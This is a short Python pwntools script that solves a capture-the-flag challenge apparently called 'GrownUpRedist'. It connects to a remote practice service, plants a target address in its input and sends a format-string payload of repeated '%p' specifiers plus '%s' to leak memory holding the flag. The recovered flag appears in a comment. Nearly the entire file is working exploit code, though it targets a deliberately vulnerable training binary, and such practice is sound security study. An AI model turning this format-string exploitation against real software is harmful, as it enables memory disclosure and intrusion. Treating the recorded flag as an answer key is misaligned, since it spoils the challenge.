from pwn import *

def sandbox():
    LOCAL = False
    elf = ELF('./GrownUpRedist')
    if LOCAL:
        r = elf.process()
    else:
        r = remote('svc.pwnable.xyz', 30004)

    l = r.recvuntil(": ")
    print(l)
    addr_of_flag = 0x601080
    r.sendline(b'YYYYAAAA' + p32(addr_of_flag))
    r.recvuntil("Name: ")
    payload = "%p" * 24 + "%s"
    payload += 'A' * (128 - len(payload))
    r.sendline(payload)
    r.interactive()
        

def main():
    sandbox()
    # FLAG{should_have_named_it_babyfsb}

if __name__ == '__main__':
    main()
